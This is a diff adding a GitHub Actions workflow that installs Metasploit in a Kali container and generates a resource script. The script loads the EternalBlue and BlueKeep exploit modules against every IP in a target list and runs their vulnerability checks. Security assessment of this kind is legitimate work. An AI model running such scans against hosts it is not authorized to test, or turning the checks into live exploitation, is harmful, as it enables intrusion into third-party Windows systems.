@@ -1,0 +1,56 @@
+name: Remote Vulnerability Assessment
+
+on:
+  workflow_dispatch:
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    container:
+      image: kalilinux/kali-rolling
+      options: --user root
+
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Install Dependencies
+        run: |
+          apt-get update
+          apt-get install -y metasploit-framework python3 python3-pip
+          
+      - name: Prepare Attack Script
+        run: |
+          python3 - <<EOF
+          import os
+          input_file = "nonla.txt"
+          output_file = "attack.rc"
+          if os.path.exists(input_file):
+              with open(input_file, "r") as f:
+                  targets = f.readlines()
+              with open(output_file, "w") as rc:
+                  rc.write("spool report.txt\n")
+                  for ip in targets:
+                      ip = ip.strip()
+                      if not ip: continue
+                      rc.write(f"use exploit/windows/smb/ms17_010_eternalblue\n")
+                      rc.write(f"set RHOSTS {ip}\n")
+                      rc.write(f"set LHOST 127.0.0.1\n")
+                      rc.write(f"check\n")
+                      rc.write(f"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n")
+                      rc.write(f"set RHOSTS {ip}\n")
+                      rc.write(f"set target 1\n")
+                      rc.write(f"check\n")
+                  rc.write("spool off\n")
+                  rc.write("exit\n")
+          EOF
+
+      - name: Run Metasploit Assessment
+        run: |
+          msfconsole -q -r attack.rc
+
+      - name: Upload Report
+        uses: actions/upload-artifact@v4
+        with:
+          name: vulnerability-report
+          path: report.txt
